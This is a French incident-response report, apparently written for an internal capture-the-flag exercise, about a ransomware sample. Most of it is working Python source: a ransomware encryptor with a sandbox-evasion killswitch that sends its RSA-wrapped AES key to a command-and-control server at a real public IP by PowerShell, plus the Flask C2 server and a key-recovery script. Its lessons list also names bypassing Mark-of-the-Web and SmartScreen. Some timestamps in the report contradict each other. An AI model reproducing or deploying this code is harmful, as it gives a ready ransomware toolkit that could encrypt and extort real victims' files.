---
Date: 2025-04-09
Template: "[[Investigation - Template]]"
tags: 
Investigateur: florian.salingue-ext
---
# Synthèse managériale
Le client ICan’tC# a contacté la société NoMoreMalwares dans le cadre d’une réponse a incident ainsi qu’une analyse Forensic suite a la compromission de son parc informatique par Ransomware.
L’incident est arrivé le 16/05/2025 à 14h00.
Le poste compromis contenait des données sensibles.
Celles-ci n’ont pas été exfiltrées, cependant, le poste avait été chiffré.
La clé de chiffrement utilisée par le ransomware a été récupérée et les fichiers ont été déchiffrés.
# Détection
Détection effectuée par un utilisateur lors de la reprise de son poste après sa pause déjeuner.
Découverte de l’incident aux alentours de 14h00
# Collecte
Collecte des artefacts via Forensic Collection (Full)
Nom du endpoint : "LA-UE-23B0039"
Nom de l'utilisateur : "florian.salingue-ext"
Date/heure : 2025-05-16 - 12:15
# Analyse
Le ransomware chiffre le dossier Document de l'utilisateur.
Les fichiers se voit attribuer une extension ".shoubadidou".
Retirer l'extension ne suffit pas a récupérer le fichier, un ouverture en HEX du fichier nous fait comprendre que celui-ci est chiffré a cause de son fort taux d'entropie.
Le fichier exécutable a l'origine de ces changements est CTF-FSA-002.exe, il est stocké sur le bureau de l'utilisateur et a été lancé manuellement d'après le process tree de SentinelOne, le process parent étant "explorer.exe"
![[Pasted image 20250516121920.png]]

## Requêtes effectuées
Plusieurs requêtes sont effectuées par le poste au moment ou le malware se déclenche
### Requêtes vers le C2
Un C2 a été identifié a l'adresse IP "35.180.193.162", il est ouvert sur le port "8999".
Des requêtes sont envoyées vers ce C2 en POST via PowerShell.
Elles contiennent le nom de la machine, le timestamp ainsi qu'une clé chiffrée en RSA.
### Requêtes du KillSwitch
Un KillSwitch est présent dans le script, une URL aléatoire est contacté, si la requête est effectuée en code 200, alors, cela a pour effet de kill le processus, empêchant son analyse en sandbox sous fakeNet.ng (logiciel qui transforme toutes les requêtes HTTP/s en 200 pour simuler un fonctionnement normal en sandbox). L'url est une chaine de charactère aléatoire de 40 charactères.
Une 2e partie du killswitch tente de se connecter a google.com, si cela fonctionne, cela signifie que le ransomware est exécuté sur un environnement véritable, et donc pas en sandbox ou toutes les connexions seront fermées.

| Killswitch    | XXXXXX.com NOK      | google.com NOK |
| ------------- | ------------------- | -------------- |
| XXXXXX.com OK | X                   | X              |
| google.com OK | Continue (env réel) | X              |

# Contenir
La machine a été placé en quarantaine pour couper toutes connexion vers l'extérieur, que ce soit le réseau interne Clariane ou le C2 de l'attaquant.
# Eradication
Le ransomware a été éradiquer en : 
- supprimant le fichier malicieux depuis le poste + le serveur sécurité
Aucun mécanisme de persistance n'a été remonté, la machine n'a pas besoin d'une remasterisassions, cependant, celle-ci est conseillé en cas de mécanisme n'ayant pas été relevé
# Recouvrir
Les données ont été recouverte en utilisant la clé AES récupérée depuis le dump mémoire récolté via Remote Ops Forensic Collection (SentinelOne)
Les fichiers ont été déchiffrés en utilisant un script custom qui prend la clé AES en input et le répertoire a déchiffrer en output.
# Leçon apprises
## Expériences gagnées
Du point de vue du réalisateur du CTF : 
- Comment écrire un ransomware
	- Comment faire un killswitch complexe
	- Comment chiffrer de façon symétrique
	- Comment chiffrer de façon asymétrique
	- Comment faire un C2
	- Comment faire un déchiffreur
	- Comment transformer un .py en .exe
- Comment fonctionne la MotW (et comment le contourner)
- Comment fonctionne smartscreen
- Management d'instance AWS (EC2, groupe de sécurité, firewall cloud, facturation, IP publique, ...)
- Créer un environnement fictif pour déploiement d'un CTF
- Comment créer un service sur linux

## Problèmes rencontrés
- Déchiffrement difficile a développer de manière stable, beaucoup mieux depuis que la clé public est passée en base64
- Problème de stabilité du beacon, si pas lancé en service, le C2 peut être lancé en manuel avec "&" a la fin pour passer la tâche en background, le service fonctionne encore, cependant, il ne reçoit rien et on a une erreur lors de l'exec du payload
- Smartscreen qui bloquait le fichier a cause du MotW
- Le killswitch ne fonctionnait pas au début car lors d'une requête sur une URL qui n'existe pas, on a pas de code HTTP, donc on ne peux pas faire un !=200, on obtient une erreur donc il faut utiliser une exception
- J'ai du réfléchir a comment stocker les résultats, pendant un moment, je suis resté sur des .log HTTP flask, ce qui fonctionnait, cependant, pour rendre le déchiffrement possible, j'ai du adapter ma méthode et passer par des .json
- Depuis Python, on ne peux pas faire de requêtes WEB comme on le souhaite depuis un exe, cela ne fonctionne pas, probablement par politique (alors que depuis vscode, aucun soucis, mais le but reste d'avoir un exe donc ...), il a fallut passer par subprocess.run pour exécuter du PowerShell et faire une requête HTTP depuis PowerShell pour envoyer les données au C2 en contexte Clariane.
- Les exclusions pour SentinelOne sont un peu ... ... tendancieuses, dans le sens ou j'ai pas besoin d'en faire une, le script semble fonctionner même sans exclusions, mais je recommande tout de même de le lancer depuis le Desktop le temps de faire le CTF, on testera cela après le CTF

---

# Code du payload (CTF-FSA-002.py)
```Python
import requests
import sys
import random
import string
import shutil
import socket
import datetime
import os
import subprocess
import json
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
import base64

def killswitch():
    url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
    try:
        request_random = requests.get(url)
        if request_random.status_code == 200:
            return True
    except requests.exceptions.RequestException:
        pass
    try:
        request_google = requests.get("https://www.google.com")
        if request_google.status_code == 200:
            return False
        else:
            return True
    except requests.exceptions.RequestException:
        return True

def generate_aes_key():
    return get_random_bytes(32)

def list_files_in_fake_env(fake_root):
    if not fake_root.exists():
        return None
    files = []
    for foldername, subfolders, filenames in os.walk(fake_root):
        for filename in filenames:
            file_path = Path(foldername) / filename
            files.append(file_path)
    return files

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(file_data, AES.block_size))
    encrypted_file_path = file_path.with_suffix(file_path.suffix + '.shoubadidou')
    with open(encrypted_file_path, 'wb') as f:
        f.write(cipher.iv)
        f.write(ct_bytes)
    os.remove(file_path)

def encrypt_fake_env_files():
    fake_root = Path.home() / "Documents" / "CTF-FSA-002_Documents"
    if not fake_root.exists():
        return
    aes_key = generate_aes_key()
    send_aes_key_to_c2(aes_key)
    files_to_encrypt = list_files_in_fake_env(fake_root)
    if not files_to_encrypt:
        return
    for file_path in files_to_encrypt:
        encrypt_file(file_path, aes_key)

def send_aes_key_to_c2(key):
    public_key = load_rsa_public_key()
    encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
    c2_url = "http://35.180.193.162:8999"
    hostname = socket.gethostname()
    timestamp = datetime.datetime.now().isoformat()
    payload = {
        "aes_key": encrypted_aes_key.hex(),
        "hostname": hostname,
        "timestamp": timestamp
    }
    json_payload = json.dumps(payload)
    powershell_command = f'''
Invoke-RestMethod -Uri "{c2_url}" -Method Post -Body '{json_payload}' -ContentType "application/json"
'''
    try:
        subprocess.run(
            ["powershell", "-Command", powershell_command],
            capture_output=True,
            text=True,
            timeout=10
        )
    except Exception:
        pass

def load_rsa_public_key():
    b64_key = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnAB7GQ1uawa9iwN0KJjOo4NLfe6eda7MBFb41FY1/siCx0rQ9UYMrmoAl3YHyxY2X1NbJDEkE5U96warIgk6yukTwEsMC9vzsYTgbfIlXkHVBFiB+4XK6cFMo+syxWziqLclWlYRpqWaPiBZAKIuHptXUUT60b5VBZM1cKk6d5E5ASkGBm30iANIhcBG6YjWfn/MdgP4HcHmUrG9NmCaaosXiQxMMcFDBm8ASFSBAfER3jGmNiMYR0mVbBo6wBWAXXOLJiJiRaPPgH/wJ3S8/2SwexNHKWwhZ1FPvZ2E+DtVcSUi1eKBCyl9E0mtq9IjMD1nm+y9f90Lsmrq8h63fwIDAQAB"
    der_key = base64.b64decode(b64_key)
    return RSA.import_key(der_key)

def encrypt_aes_key_with_rsa(aes_key, public_key):
    cipher_rsa = PKCS1_OAEP.new(public_key)
    return cipher_rsa.encrypt(aes_key)

if killswitch():
    sys.exit()
else:
    encrypt_fake_env_files()

```

# Code du C2 (beacon+.py)
```Python
#!/usr/bin/env python3

import os
import json
from flask import Flask, request
from rich.console import Console
from rich.table import Table

app = Flask(__name__)
DATA_FILE = "data.json"
console = Console()

# Initialisation du fichier JSON
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)

# Enregistre les données reçues dans le fichier
def save_data(new_data):
    with open(DATA_FILE, 'r+') as f:
        data = json.load(f)
        data.append(new_data)
        f.seek(0)
        json.dump(data, f, indent=4)

# Affiche les données reçues sous forme de tableau
def display_table():
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)

    if not data:
        console.print("[bold yellow]Aucune donnée reçue pour le moment.[/bold yellow]")
        return

    keys = set()
    for entry in data:
        keys.update(entry.keys())

    table = Table(title="Données Reçues du C2")
    for key in sorted(keys):
        table.add_column(key, overflow="fold")

    for entry in data:
        row = [str(entry.get(key, '')) for key in sorted(keys)]
        table.add_row(*row)

    console.print(table)

@app.route('/', methods=['POST'])
def receive():
    try:
        incoming = request.json or request.form.to_dict() or request.get_data(as_text=True)
        if isinstance(incoming, str):
            incoming = {"raw": incoming}
        save_data(incoming)
        return {"status": "received"}, 200
    except Exception as e:
        return {"error": str(e)}, 500

@app.route('/view', methods=['GET'])
def view():
    display_table()
    return {"status": "shown in CLI"}, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8999)
```

# Code du déchiffreur
```Python
import json
import argparse
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from pathlib import Path

def load_private_key():
    with open("/home/ubuntu/RSA/private_key.pem", "rb") as f:
        return RSA.import_key(f.read())

def decrypt_aes_key(encrypted_hex, private_key):
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa.decrypt(encrypted_bytes)

def main(hostname):
    private_key = load_private_key()

    with open("/home/ubuntu/c2/data.json", "r") as f:
        data = json.load(f)

    entries = [d for d in data if d.get("hostname") == hostname]

    if not entries:
        print(f"[!] Aucun résultat pour {hostname}")
        return

    print(f"[INFO] {len(entries)} clé(s) trouvée(s) pour {hostname}:\n")

    for idx, entry in enumerate(entries, 1):
        try:
            aes_key = decrypt_aes_key(entry["aes_key"], private_key)
            print(f"[{idx}] Déchiffrée ✅ (timestamp: {entry['timestamp']}): {aes_key.hex()}")
        except Exception as e:
            print(f"[{idx}] ❌ Échec de déchiffrement (timestamp: {entry['timestamp']}): {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Déchiffre les clés AES par hostname")
    parser.add_argument("--host", required=True, help="Nom d'hôte (hostname)")
    args = parser.parse_args()

    main(args.host)
```